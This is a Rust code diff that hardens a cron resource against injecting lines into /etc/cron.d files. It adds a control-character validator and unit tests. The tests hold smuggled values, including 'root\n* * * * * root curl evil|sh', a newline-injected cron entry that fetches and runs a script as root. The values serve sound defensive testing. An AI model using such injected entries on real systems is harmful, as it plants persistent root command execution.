@@ -69,6 +69,19 @@ fn validate_schedule(schedule: &str) -> Result<(), Error> {
     Ok(())
 }
 
+/// Reject newlines and other control characters in cron fields that are
+/// written verbatim into /etc/cron.d/<name>. Prevents injecting extra lines.
+fn validate_cron_field(label: &str, value: &str) -> Result<(), Error> {
+    if let Some(bad) = value.chars().find(|c| c.is_control()) {
+        return Err(Error::Resource(format!(
+            "cron {label} contains a control character ({:#x}); newlines and \
+             control characters are not allowed",
+            bad as u32
+        )));
+    }
+    Ok(())
+}
+
 /// Reject newlines in commands to prevent injecting extra cron lines.
 fn validate_command(command: &str) -> Result<(), Error> {
     if command.contains('\n') {
@@ -249,6 +262,21 @@ pub fn execute(resource: &ResolvedResource, dry_run: bool) -> Result<ResourceRes
         .get("user")
         .and_then(|v| v.as_str())
         .ok_or_else(|| Error::Resource("cron resource requires 'user'".into()))?;
+
+    validate_cron_field("user", user)?;
+
+    if let Some(mailto) = resource.props.get("mailto").and_then(|v| v.as_str()) {
+        validate_cron_field("mailto", mailto)?;
+    }
+
+    if let Some(env) = resource.props.get("env").and_then(|v| v.as_table()) {
+        for (k, v) in env {
+            validate_cron_field("env key", k)?;
+            if let Some(val) = v.as_str() {
+                validate_cron_field("env value", val)?;
+            }
+        }
+    }
 
     let jobs = parse_jobs(resource)?;
     let mailto = resource.props.get("mailto").and_then(|v| v.as_str());
@@ -509,5 +537,65 @@ mod tests {
         let content = build_file_content("root", &jobs, None, None);
         assert!(content.contains("0 20 * * 1-4  root  /run.sh\n"));
         assert!(content.contains("0 20 * * 5  root  /run.sh --close-week\n"));
+    }
+
+    fn make_cron_resource(props: &[(&str, toml::Value)]) -> ResolvedResource {
+        let mut map = std::collections::HashMap::new();
+        for (k, v) in props {
+            map.insert((*k).to_string(), v.clone());
+        }
+        ResolvedResource {
+            resource_type: "cron".into(),
+            name: "testjob".into(),
+            props: map,
+            after: vec![],
+            notify: vec![],
+            when: None,
+            handler: false,
+            register: None,
+        }
+    }
+
+    #[test]
+    fn cron_user_with_newline_is_rejected() {
+        let r = make_cron_resource(&[
+            ("schedule", toml::Value::String("* * * * *".into())),
+            ("command", toml::Value::String("/bin/true".into())),
+            (
+                "user",
+                toml::Value::String("root\n* * * * * root curl evil|sh".into()),
+            ),
+        ]);
+        let err = execute(&r, true).unwrap_err();
+        assert!(err.to_string().contains("user"), "got: {err}");
+    }
+
+    #[test]
+    fn cron_mailto_with_newline_is_rejected() {
+        let r = make_cron_resource(&[
+            ("schedule", toml::Value::String("* * * * *".into())),
+            ("command", toml::Value::String("/bin/true".into())),
+            ("user", toml::Value::String("root".into())),
+            ("mailto", toml::Value::String("a@b\n* * * * * evil".into())),
+        ]);
+        let err = execute(&r, true).unwrap_err();
+        assert!(err.to_string().contains("mailto"), "got: {err}");
+    }
+
+    #[test]
+    fn cron_env_value_with_newline_is_rejected() {
+        let mut env = toml::value::Table::new();
+        env.insert(
+            "PATH".into(),
+            toml::Value::String("/usr/bin\n* * * * * evil".into()),
+        );
+        let r = make_cron_resource(&[
+            ("schedule", toml::Value::String("* * * * *".into())),
+            ("command", toml::Value::String("/bin/true".into())),
+            ("user", toml::Value::String("root".into())),
+            ("env", toml::Value::Table(env)),
+        ]);
+        let err = execute(&r, true).unwrap_err();
+        assert!(err.to_string().contains("env"), "got: {err}");
     }
 }
